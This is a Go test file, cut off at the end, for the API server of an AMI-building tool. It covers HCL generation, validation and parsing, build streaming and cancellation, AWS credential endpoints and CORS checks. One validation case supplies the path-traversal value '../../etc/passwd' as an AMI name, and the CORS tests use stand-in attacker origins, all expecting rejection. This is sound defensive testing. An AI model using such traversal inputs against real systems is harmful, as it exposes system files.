package api

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	vibaws "github.com/santhosh/vib/internal/aws"
	"github.com/santhosh/vib/internal/config"
	"github.com/santhosh/vib/internal/generator"
	"github.com/santhosh/vib/internal/packer"
	vibstore "github.com/santhosh/vib/internal/store"
)

func newTestRequest(method, target string, body io.Reader) *http.Request {
	req := httptest.NewRequest(method, target, body)
	if method == http.MethodPost || method == http.MethodDelete || method == http.MethodPut {
		req.Header.Set("X-VIB-CSRF-Protection", "1")
	}
	return req
}

func createMockPacker(t *testing.T) string {
	tmpDir := t.TempDir()
	mockScriptPath := filepath.Join(tmpDir, "mock-packer.sh")

	script := `#!/bin/sh
set -e
cmd="$1"
shift
case "$cmd" in
  version)
    echo "Packer v1.16.1"
    ;;
  init)
    echo "Installed plugin github.com/hashicorp/amazon"
    ;;
  validate)
    echo "The configuration is valid."
    ;;
  build)
    echo "==> amazon-ebs.vib: Prevalidating AMI Name..."
    sleep 0.1
    echo "==> amazon-ebs.vib: Creating temporary keypair..."
    sleep 0.1
    echo "==> amazon-ebs.vib: Launching source EC2 instance..."
    cat << 'EOF' > manifest.json
{
  "builds": [
    {
      "name": "vib-build",
      "builder_type": "amazon-ebs",
      "build_time": 1729074321,
      "artifact_id": "ap-south-1:ami-0123456789mockami",
      "packer_run_uuid": "mock-run-uuid-123"
    }
  ],
  "last_run_uuid": "mock-run-uuid-123"
}
EOF
    echo "==> amazon-ebs.vib: Build finished successfully"
    ;;
  *)
    echo "Unknown command: $cmd" >&2
    exit 1
    ;;
esac
`
	if err := os.WriteFile(mockScriptPath, []byte(script), 0755); err != nil {
		t.Fatalf("failed to create mock script: %v", err)
	}
	return mockScriptPath
}

func createSlowMockPacker(t *testing.T) string {
	tmpDir := t.TempDir()
	mockScriptPath := filepath.Join(tmpDir, "slow-mock-packer.sh")

	script := `#!/bin/sh
cmd="$1"
shift
case "$cmd" in
  init)
    echo "Installed plugin github.com/hashicorp/amazon"
    ;;
  validate)
    echo "The configuration is valid."
    ;;
  build)
    echo "==> amazon-ebs.vib: Starting long build step..."
    sleep 10
    ;;
  *)
    exit 0
    ;;
esac
`
	if err := os.WriteFile(mockScriptPath, []byte(script), 0755); err != nil {
		t.Fatalf("failed to create slow mock script: %v", err)
	}
	return mockScriptPath
}

func TestCORSHeaders(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("Allowed localhost origin", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodOptions, "/api/catalogue", nil)
		req.Header.Set("Origin", "http://localhost:5173")
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusNoContent {
			t.Errorf("expected status 204 for OPTIONS preflight, got %d", w.Code)
		}
		if w.Header().Get("Access-Control-Allow-Origin") != "http://localhost:5173" {
			t.Errorf("expected Access-Control-Allow-Origin: http://localhost:5173, got %q", w.Header().Get("Access-Control-Allow-Origin"))
		}
		if !strings.Contains(w.Header().Get("Access-Control-Allow-Methods"), "POST") {
			t.Errorf("expected Allow-Methods to contain POST, got %q", w.Header().Get("Access-Control-Allow-Methods"))
		}
	})

	t.Run("Blocked untrusted external origin", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(`{}`))
		req.Header.Set("Origin", "https://malicious-website.com")
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("expected status 403 Forbidden for untrusted origin, got %d", w.Code)
		}
	})
}

func TestGetHealth(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
	w := httptest.NewRecorder()

	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", w.Code)
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid json response: %v", err)
	}

	if resp["status"] != "ok" {
		t.Errorf("expected status 'ok', got %v", resp["status"])
	}
}

func TestGetCatalogue(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	req := httptest.NewRequest(http.MethodGet, "/api/catalogue", nil)
	w := httptest.NewRecorder()

	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", w.Code)
	}

	var resp struct {
		Packages []CataloguePackage `json:"packages"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}

	if len(resp.Packages) < 3 {
		t.Fatalf("expected at least 3 packages, got %d", len(resp.Packages))
	}

	foundDocker := false
	for _, p := range resp.Packages {
		if p.ID == "docker" {
			foundDocker = true
			if len(p.Commands) == 0 {
				t.Errorf("expected docker commands to not be empty")
			}
		}
	}
	if !foundDocker {
		t.Errorf("expected docker package to be in catalogue")
	}
}

func TestHCLGenerate(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("Valid BuildConfig", func(t *testing.T) {
		payload := []byte(`{
			"build_id": "test-gen-01",
			"region": "ap-south-1",
			"instance_type": "t3.micro",
			"source_ami": "ami-0f58b397bc5c1f2e8",
			"ssh_username": "ubuntu",
			"ami_name": "vib-test-generate",
			"packages": ["nginx"]
		}`)

		req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("expected status 200, got %d (body: %s)", w.Code, w.Body.String())
		}

		var resp map[string]string
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("failed to parse json response: %v", err)
		}

		hcl := resp["hcl"]
		if !strings.Contains(hcl, `source "amazon-ebs" "vib"`) {
			t.Errorf("expected generated HCL to contain amazon-ebs source")
		}
		if !strings.Contains(hcl, `manifest.json`) {
			t.Errorf("expected generated HCL to contain manifest.json")
		}
	})

	t.Run("Invalid Payload Missing Region", func(t *testing.T) {
		payload := []byte(`{
			"instance_type": "t3.micro",
			"source_ami": "ami-0f58b397bc5c1f2e8",
			"ami_name": "vib-test"
		}`)

		req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(payload))
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected status 400 for missing region, got %d", w.Code)
		}
	})
}

func TestHCLValidate(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("Valid HCL", func(t *testing.T) {
		cfg := &config.BuildConfig{
			BuildID:      "test-val",
			Region:       "ap-south-1",
			InstanceType: "t3.micro",
			SourceAMI:    "ami-0f58b397bc5c1f2e8",
			SSHUsername:  "ubuntu",
			AMIName:      "vib-test",
		}
		hclBytes, _ := generator.GenerateHCL(cfg)

		reqBody, _ := json.Marshal(HCLValidateRequest{HCL: string(hclBytes)})
		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("expected status 200, got %d", w.Code)
		}

		var resp HCLValidateResponse
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("failed to unmarshal validate response: %v", err)
		}

		if !resp.Valid {
			t.Errorf("expected valid=true, got false (err: %s)", resp.Error)
		}
		if len(resp.Logs) == 0 {
			t.Errorf("expected logs to be populated")
		}
	})

	t.Run("Empty HCL", func(t *testing.T) {
		reqBody, _ := json.Marshal(HCLValidateRequest{HCL: ""})
		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(reqBody))
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected status 400 for empty HCL, got %d", w.Code)
		}
	})
}

func TestBuildLifecycleAndSSEStream(t *testing.T) {
	mockScript := createMockPacker(t)
	runner := packer.NewRunner(mockScript)
	server := NewServer(runner)

	// 1. Create a build
	buildPayload := []byte(`{
		"build_id": "test-build-sse-01",
		"region": "ap-south-1",
		"instance_type": "t3.micro",
		"source_ami": "ami-0f58b397bc5c1f2e8",
		"ssh_username": "ubuntu",
		"ami_name": "vib-sse-test",
		"packages": ["git"]
	}`)

	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
	w := httptest.NewRecorder()

	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusAccepted {
		t.Fatalf("expected status 202 Accepted, got %d (body: %s)", w.Code, w.Body.String())
	}

	var createResp map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &createResp); err != nil {
		t.Fatalf("invalid json response: %v", err)
	}

	buildID := createResp["build_id"].(string)
	if buildID != "test-build-sse-01" {
		t.Errorf("expected build_id test-build-sse-01, got %q", buildID)
	}

	// 2. Connect to SSE stream endpoint using httptest.Server to support real streaming
	ts := httptest.NewServer(server.Routes())
	defer ts.Close()

	streamURL := fmt.Sprintf("%s/api/builds/%s/stream", ts.URL, buildID)
	streamReq, err := http.NewRequest(http.MethodGet, streamURL, nil)
	if err != nil {
		t.Fatalf("failed to create stream request: %v", err)
	}

	resp, err := http.DefaultClient.Do(streamReq)
	if err != nil {
		t.Fatalf("failed to connect to stream: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected stream status 200, got %d", resp.StatusCode)
	}
	if !strings.Contains(resp.Header.Get("Content-Type"), "text/event-stream") {
		t.Errorf("expected Content-Type text/event-stream, got %q", resp.Header.Get("Content-Type"))
	}

	// Read SSE stream lines
	scanner := bufio.NewScanner(resp.Body)
	var eventsReceived []string
	var lastEventName string
	var finalStatus BuildStatusSummary
	gotFinalStatus := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "event: ") {
			lastEventName = strings.TrimPrefix(line, "event: ")
			eventsReceived = append(eventsReceived, lastEventName)
		} else if strings.HasPrefix(line, "data: ") {
			data := strings.TrimPrefix(line, "data: ")
			if lastEventName == "status" {
				if err := json.Unmarshal([]byte(data), &finalStatus); err == nil {
					gotFinalStatus = true
					break
				}
			}
		}
	}

	if !gotFinalStatus {
		t.Fatalf("expected to receive final status event, none received")
	}

	if finalStatus.Status != "success" {
		t.Errorf("expected final status success, got %q (err: %s)", finalStatus.Status, finalStatus.Error)
	}
	if finalStatus.AMIID != "ami-0123456789mockami" {
		t.Errorf("expected AMI ID ami-0123456789mockami, got %q", finalStatus.AMIID)
	}

	// 3. Verify GET /api/builds and GET /api/builds/{id}
	getReq := httptest.NewRequest(http.MethodGet, "/api/builds/"+buildID, nil)
	getW := httptest.NewRecorder()
	server.Routes().ServeHTTP(getW, getReq)

	if getW.Code != http.StatusOK {
		t.Errorf("expected GET /api/builds/{id} to return 200, got %d", getW.Code)
	}

	listReq := httptest.NewRequest(http.MethodGet, "/api/builds", nil)
	listW := httptest.NewRecorder()
	server.Routes().ServeHTTP(listW, listReq)

	if listW.Code != http.StatusOK {
		t.Errorf("expected GET /api/builds to return 200, got %d", listW.Code)
	}
}

func TestCancelBuild(t *testing.T) {
	slowMockScript := createSlowMockPacker(t)
	runner := packer.NewRunner(slowMockScript)
	server := NewServer(runner)

	// 1. Start a slow build
	buildPayload := []byte(`{
		"build_id": "test-build-cancel-01",
		"region": "ap-south-1",
		"instance_type": "t3.micro",
		"source_ami": "ami-0f58b397bc5c1f2e8",
		"ssh_username": "ubuntu",
		"ami_name": "vib-cancel-test",
		"packages": ["docker"]
	}`)

	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(buildPayload))
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusAccepted {
		t.Fatalf("expected status 202, got %d", w.Code)
	}

	// Give the build a moment to start running
	time.Sleep(100 * time.Millisecond)

	// 2. Cancel the build
	cancelReq := newTestRequest(http.MethodPost, "/api/builds/test-build-cancel-01/cancel", nil)
	cancelW := httptest.NewRecorder()
	server.Routes().ServeHTTP(cancelW, cancelReq)

	if cancelW.Code != http.StatusOK {
		t.Fatalf("expected status 200 on cancel, got %d (body: %s)", cancelW.Code, cancelW.Body.String())
	}

	var cancelResp map[string]interface{}
	_ = json.Unmarshal(cancelW.Body.Bytes(), &cancelResp)
	if cancelResp["status"] != "cancelling" {
		t.Errorf("expected status 'cancelling', got %v", cancelResp["status"])
	}

	// 3. Cancelling non-existent build returns 404
	badCancelReq := newTestRequest(http.MethodPost, "/api/builds/non-existent-build-id/cancel", nil)
	badCancelW := httptest.NewRecorder()
	server.Routes().ServeHTTP(badCancelW, badCancelReq)

	if badCancelW.Code != http.StatusNotFound {
		t.Errorf("expected 404 for non-existent build, got %d", badCancelW.Code)
	}
}

func TestStaticUIServing(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	// Since web/dist exists with index.html, it should serve 200 with HTML
	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200 for root static UI request, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "<!doctype html>") && !strings.Contains(w.Body.String(), "<html") {
		t.Errorf("expected HTML content in root static response, got %s", w.Body.String()[:min(100, len(w.Body.String()))])
	}
}

func TestAWSStatusEndpoint(t *testing.T) {
	cm, err := vibaws.NewCredentialManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewCredentialManager failed: %v", err)
	}

	server := NewServer(packer.NewRunner(createMockPacker(t)), cm)

	req := httptest.NewRequest(http.MethodGet, "/api/aws/status?region=ap-south-1", nil)
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", w.Code)
	}

	var identity vibaws.IdentityInfo
	if err := json.Unmarshal(w.Body.Bytes(), &identity); err != nil {
		t.Fatalf("failed to parse json response: %v", err)
	}
	if identity.Region != "ap-south-1" {
		t.Errorf("expected region ap-south-1, got %q", identity.Region)
	}
}

func TestAWSCredentialsEndpoints(t *testing.T) {
	cm, err := vibaws.NewCredentialManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewCredentialManager failed: %v", err)
	}

	server := NewServer(packer.NewRunner(createMockPacker(t)), cm)

	// 1. Missing keys returns 400
	badBody := []byte(`{"access_key_id":"","secret_access_key":""}`)
	req := newTestRequest(http.MethodPost, "/api/aws/credentials", bytes.NewReader(badBody))
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for empty credentials, got %d", w.Code)
	}

	// 2. DELETE /api/aws/credentials clears credentials
	delReq := newTestRequest(http.MethodDelete, "/api/aws/credentials", nil)
	delW := httptest.NewRecorder()
	server.Routes().ServeHTTP(delW, delReq)
	if delW.Code != http.StatusOK {
		t.Errorf("expected 200 on DELETE, got %d", delW.Code)
	}
}

func TestAWSBaseAMIsEndpoint(t *testing.T) {
	cm, err := vibaws.NewCredentialManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewCredentialManager failed: %v", err)
	}

	server := NewServer(packer.NewRunner(createMockPacker(t)), cm)

	req := httptest.NewRequest(http.MethodGet, "/api/aws/base-amis?region=ap-south-1&arch=x86_64", nil)
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp vibaws.BaseAMIResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse json: %v", err)
	}

	if resp.Region != "ap-south-1" || resp.Arch != "x86_64" {
		t.Errorf("unexpected region/arch: %s / %s", resp.Region, resp.Arch)
	}
	// Without credentials in test environment, response must be not_connected with 0 images
	if resp.Source != "not_connected" && resp.Source != "aws_live" {
		t.Errorf("expected source not_connected or aws_live, got %q", resp.Source)
	}
}

func TestImagesEndpoints(t *testing.T) {
	dbStore, err := vibstore.NewDB(":memory:")
	if err != nil {
		t.Fatalf("failed to create in-memory store: %v", err)
	}
	defer dbStore.Close()

	// Seed records in DB
	err = dbStore.CreateBuild(&vibstore.BuildRecord{
		BuildID:         "build-img-1",
		AMIID:           "ami-111222333444555aa",
		AMIName:         "vib-ubuntu-app",
		Region:          "ap-south-1",
		Status:          "success",
		HCLCode:         "source \"amazon-ebs\" \"vib\" {}",
		ConfigJSON:      `{"ami_name":"vib-ubuntu-app","region":"ap-south-1","packages":["nginx"]}`,
		DurationSeconds: 95,
	})
	if err != nil {
		t.Fatalf("CreateBuild failed: %v", err)
	}

	server := NewServer(packer.NewRunner(createMockPacker(t)), dbStore)

	// 1. GET /api/images
	req := httptest.NewRequest(http.MethodGet, "/api/images?region=ap-south-1", nil)
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("GET /api/images expected 200, got %d", w.Code)
	}

	var listResp struct {
		Images []ImageItem `json:"images"`
		Total  int         `json:"total"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &listResp); err != nil {
		t.Fatalf("failed to parse /api/images JSON: %v", err)
	}
	if listResp.Total < 1 {
		t.Fatalf("expected at least 1 image, got %d", listResp.Total)
	}
	if listResp.Images[0].AMIID != "ami-111222333444555aa" {
		t.Errorf("expected AMI ID ami-111222333444555aa, got %s", listResp.Images[0].AMIID)
	}

	// 2. GET /api/images/{id}/config
	reqCfg := httptest.NewRequest(http.MethodGet, "/api/images/ami-111222333444555aa/config", nil)
	wCfg := httptest.NewRecorder()
	server.Routes().ServeHTTP(wCfg, reqCfg)

	if wCfg.Code != http.StatusOK {
		t.Fatalf("GET /api/images/.../config expected 200, got %d", wCfg.Code)
	}

	var cfgResp map[string]interface{}
	if err := json.Unmarshal(wCfg.Body.Bytes(), &cfgResp); err != nil {
		t.Fatalf("failed to parse config JSON: %v", err)
	}
	if cfgResp["ami_id"] != "ami-111222333444555aa" {
		t.Errorf("expected ami_id ami-111222333444555aa, got %v", cfgResp["ami_id"])
	}
	if cfgResp["hcl_code"] != "source \"amazon-ebs\" \"vib\" {}" {
		t.Errorf("unexpected hcl_code: %v", cfgResp["hcl_code"])
	}

	// 3. DELETE /api/images/{id}
	reqDel := newTestRequest(http.MethodDelete, "/api/images/ami-111222333444555aa", nil)
	wDel := httptest.NewRecorder()
	server.Routes().ServeHTTP(wDel, reqDel)

	if wDel.Code != http.StatusOK {
		t.Fatalf("DELETE /api/images/... expected 200, got %d", wDel.Code)
	}

	// Verify marked deleted in SQLite
	updatedRec, err := dbStore.GetBuild("build-img-1")
	if err != nil {
		t.Fatalf("GetBuild failed: %v", err)
	}
	if updatedRec.Status != "deleted" {
		t.Errorf("expected status 'deleted', got %s", updatedRec.Status)
	}
}

func TestBuildPersistsToSQLite(t *testing.T) {
	dbStore, err := vibstore.NewDB(":memory:")
	if err != nil {
		t.Fatalf("failed to create in-memory store: %v", err)
	}
	defer dbStore.Close()

	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner, dbStore)

	payload := []byte(`{
		"build_id": "sqlite-build-1",
		"config": {
			"region": "ap-south-1",
			"instance_type": "t3.micro",
			"source_ami": "ami-0f58b397bc5c1f2e8",
			"ssh_username": "ubuntu",
			"ami_name": "sqlite-test-app",
			"packages": ["docker"]
		}
	}`)

	req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusAccepted {
		t.Fatalf("expected 202 Accepted, got %d: %s", w.Code, w.Body.String())
	}

	// Initial record in DB should exist
	rec, err := dbStore.GetBuild("sqlite-build-1")
	if err != nil {
		t.Fatalf("expected initial build record in SQLite: %v", err)
	}
	if rec.BuildID != "sqlite-build-1" {
		t.Errorf("expected build_id sqlite-build-1, got %s", rec.BuildID)
	}

	// Wait for mock packer build to finish
	build := server.BuildManager().GetBuild("sqlite-build-1")
	if build == nil {
		t.Fatalf("build not found in BuildManager")
	}

	select {
	case <-build.done:
	case <-time.After(3 * time.Second):
		t.Fatalf("timeout waiting for build completion")
	}

	// Verify updated record in SQLite
	finalRec, err := dbStore.GetBuild("sqlite-build-1")
	if err != nil {
		t.Fatalf("failed to get final build record: %v", err)
	}
	if finalRec.Status != "success" {
		t.Errorf("expected status 'success', got %s", finalRec.Status)
	}
	if finalRec.AMIID != "ami-0123456789mockami" {
		t.Errorf("expected AMI ID 'ami-0123456789mockami', got %s", finalRec.AMIID)
	}
}

func TestHCLParseEndpoint(t *testing.T) {
	server := NewServer(nil)

	t.Run("Valid HCL", func(t *testing.T) {
		validHCL := `
packer {
  required_plugins {
    amazon = {
      version = ">= 1.2.8"
      source  = "github.com/hashicorp/amazon"
    }
  }
}

source "amazon-ebs" "vib" {
  ami_name      = "my-parsed-ami-{{timestamp}}"
  instance_type = "t3.micro"
  region        = "ap-south-1"
  source_ami    = "ami-0f58b397bc5c1f2e8"
  ssh_username  = "ubuntu"
}

build {
  sources = ["source.amazon-ebs.vib"]

  provisioner "shell" {
    inline = [
      "sudo apt-get update -y",
      "sudo apt-get install -y nginx",
      "sudo systemctl enable nginx",
      "echo 'Custom step'"
    ]
  }
}
`
		payload, _ := json.Marshal(map[string]string{"hcl": validHCL})
		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("expected 200 OK, got %d: %s", w.Code, w.Body.String())
		}

		var resp struct {
			Config *config.BuildConfig `json:"config"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("failed to decode response: %v", err)
		}
		if resp.Config == nil {
			t.Fatal("expected config in response, got nil")
		}
		if resp.Config.AMIName != "my-parsed-ami" {
			t.Errorf("expected AMIName 'my-parsed-ami', got %q", resp.Config.AMIName)
		}
		if resp.Config.Region != "ap-south-1" {
			t.Errorf("expected Region 'ap-south-1', got %q", resp.Config.Region)
		}
		if len(resp.Config.Packages) != 1 || resp.Config.Packages[0] != "nginx" {
			t.Errorf("expected Packages ['nginx'], got %v", resp.Config.Packages)
		}
		if len(resp.Config.CustomScript) != 1 || resp.Config.CustomScript[0] != "echo 'Custom step'" {
			t.Errorf("expected CustomScript ['echo 'Custom step''], got %v", resp.Config.CustomScript)
		}
	})

	t.Run("Malformed HCL", func(t *testing.T) {
		payload, _ := json.Marshal(map[string]string{"hcl": "source amazon-ebs {"})
		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400 Bad Request, got %d", w.Code)
		}
	})

	t.Run("Empty HCL", func(t *testing.T) {
		payload, _ := json.Marshal(map[string]string{"hcl": "   "})
		req := newTestRequest(http.MethodPost, "/api/hcl/parse", bytes.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400 Bad Request, got %d", w.Code)
		}
	})
}

func TestHandleHCLGenerate_ValidationErrors(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	tests := []struct {
		name       string
		payload    string
		wantStatus int
	}{
		{"Invalid JSON", `{"region": "ap-south-1",`, http.StatusBadRequest},
		{"Empty Object", `{}`, http.StatusBadRequest},
		{"Missing AMI Name", `{"region":"ap-south-1","instance_type":"t3.micro","source_ami":"ami-12345"}`, http.StatusBadRequest},
		{"Path Traversal AMI Name", `{"region":"ap-south-1","instance_type":"t3.micro","source_ami":"ami-12345","ami_name":"../../etc/passwd"}`, http.StatusBadRequest},
		{"Invalid Region", `{"region":"invalid-region-99","instance_type":"t3.micro","source_ami":"ami-12345","ami_name":"valid-name"}`, http.StatusBadRequest},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(tc.payload))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			server.Routes().ServeHTTP(w, req)

			if w.Code != tc.wantStatus {
				t.Errorf("expected status %d, got %d (body: %s)", tc.wantStatus, w.Code, w.Body.String())
			}
		})
	}
}

func TestHandleHCLValidate_EdgeCases(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	t.Run("Invalid JSON", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{invalid}`))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})

	t.Run("Empty HCL", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/hcl/validate", strings.NewReader(`{"hcl":"   "}`))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})
}

func TestHandleBuild_NotFoundAndEdgeCases(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	t.Run("Get Nonexistent Build", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/builds/nonexistent-123", nil)
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404, got %d", w.Code)
		}
	})

	t.Run("Cancel Nonexistent Build", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/builds/nonexistent-123/cancel", nil)
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404, got %d", w.Code)
		}
	})

	t.Run("Stream Nonexistent Build", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/builds/nonexistent-123/stream", nil)
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404, got %d", w.Code)
		}
	})

	t.Run("Create Build Invalid JSON", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(`{bad json`))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})
}

func TestHandleAWSCredentials_ValidationAndAccessors(t *testing.T) {
	credMgr, err := vibaws.NewCredentialManager(t.TempDir())
	if err != nil {
		t.Fatalf("failed to init credMgr: %v", err)
	}

	dbStore, err := vibstore.NewDB(":memory:")
	if err != nil {
		t.Fatalf("failed to init dbStore: %v", err)
	}
	defer dbStore.Close()

	server := NewServer(packer.NewRunner(""), credMgr, dbStore)

	// Verify getters
	if server.CredentialManager() != credMgr {
		t.Errorf("server.CredentialManager() returned unexpected pointer")
	}
	if server.Store() != dbStore {
		t.Errorf("server.Store() returned unexpected pointer")
	}

	t.Run("Invalid JSON", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{invalid`))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})

	t.Run("Missing Access Key", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/aws/credentials", strings.NewReader(`{"secret_access_key":"secret"}`))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})

	t.Run("Clear Credentials", func(t *testing.T) {
		req := newTestRequest(http.MethodDelete, "/api/aws/credentials", nil)
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
	})
}

func TestCORSMiddleware_Origins(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	t.Run("Allowed Origin on GET", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
		req.Header.Set("Origin", "http://localhost:5173")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
		if got := w.Header().Get("Access-Control-Allow-Origin"); got != "http://localhost:5173" {
			t.Errorf("expected allow origin http://localhost:5173, got %q", got)
		}
	})

	t.Run("OPTIONS Preflight", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodOptions, "/api/hcl/generate", nil)
		req.Header.Set("Origin", "http://localhost:5173")
		req.Header.Set("Access-Control-Request-Method", "POST")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusNoContent {
			t.Errorf("expected 204 No Content for OPTIONS, got %d", w.Code)
		}
	})

	t.Run("Disallowed Origin on POST", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader("{}"))
		req.Header.Set("Origin", "https://attacker-domain.evil")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

